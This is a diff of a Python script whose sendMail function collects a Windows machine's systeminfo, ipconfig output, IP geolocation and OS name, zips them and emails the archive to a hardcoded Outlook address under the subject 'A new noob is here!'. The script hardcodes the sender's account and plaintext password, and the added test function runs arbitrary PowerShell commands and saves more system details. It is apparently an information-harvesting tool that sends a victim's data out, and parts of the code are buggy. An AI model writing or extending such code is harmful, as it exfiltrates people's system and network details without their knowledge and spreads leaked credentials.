@@ -21,6 +21,7 @@ def sendMail():
     proc = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE, shell=False)
     (outInfoPC, err) = proc.communicate()
     outInfoPC =  outInfoPC.decode('utf_8', 'ignore')
+    outInfoPC.replace('‚', 'é').replace('“', 'ô').replace('ÿ', ' ').replace('…', 'à')
     
     f = open(f"{pathFolder}ipconfig.txt", "w")
     f.write(os.popen("ipconfig /all").read().replace('‚', 'é').replace('“', 'ô').replace('ÿ', ' ').replace('…', 'à'))
@@ -37,6 +38,13 @@ def sendMail():
     f3 = open(f"{pathFolder}ipinfo.json", "w")
     f3.write(ipInfo)
     f3.close()
+
+    OSNameDict = dict()
+    OSNameDict['osname'] = OSName
+
+    f4 = open(f"{pathFolder}osname.json", "w")
+    f4.write(OSNameDict)
+    f4.close()
 
 
     subject = f"A new noob is here!"
@@ -56,7 +64,7 @@ def sendMail():
     message="Nice to meet you :)"
 
 
-    FROM_EMAIL = 'envoyeurg12@outlook.com'
+    FROM_EMAIL = 'envoyeurg12v2@outlook.com'
     TO_EMAIL = 'plasticeaterg12@outlook.com'
     #]>=8gY2^V~FtpKS
     PASSWORD = "SalutEnvoyeur-07-06.24"
@@ -99,7 +107,9 @@ def sendMail():
         myzip.write(f'{pathFolder}systeminfo.txt')
         myzip.write(f'{pathFolder}ipconfig.txt')
         myzip.write(f"{pathFolder}ipinfo.json")
-        myzip.write(f'readme.txt')
+        myzip.write(f"{pathFolder}osname.json")
+        # myzip.write(f'readme.txt')
+        myzip.write(f'{pathFolder}readme.txt')
 
     filename = f"{pathFolder}{zipName}.zip"
     with open(filename, 'rb') as fp:
@@ -116,3 +126,43 @@ def sendMail():
     mail.send_message(msg)
 
     mail.close()
+
+def test(cmd):
+    pathFolder = "data/"
+
+    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    completed = str(completed.stdout).replace(repr('\r\n'), ',')
+
+    f46 = open(f"{pathFolder}Get-ComputerInfo.json", "w")
+    f46.write(completed)
+    f46.close()
+
+    proc = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE, shell=False)
+    (outInfoPC, err) = proc.communicate()
+    print(type(outInfoPC))
+    # outInfoPC =  outInfoPC.decode('utf_8', 'ignore')
+    outInfoPC =  str(outInfoPC)
+    outInfoPC.replace('‚', 'é').replace(repr('\x93'), 'ô').replace('ÿ', ' ').replace('…', 'à')
+
+    f47 = open(f"{pathFolder}ragot.txt", "w")
+    f47.write(outInfoPC)
+    f47.close()
+
+
+
+    OSName = os.popen('ver').read().replace('\n', '')
+
+    OSNameDict = dict()
+
+    OSName = OSName.split("version")
+    OSNameDict['os'] = OSName
+    OSNameDict['osname'] = OSName[0]
+    OSNameDict['osversion'] = OSName[1].replace(']', '').replace(' ', '')
+
+    OSNameDict = str(OSNameDict).replace("'", '"')
+
+    f4 = open(f"{pathFolder}osname.json", "w")
+    f4.write(OSNameDict)
+    f4.close()
+
+    return completed
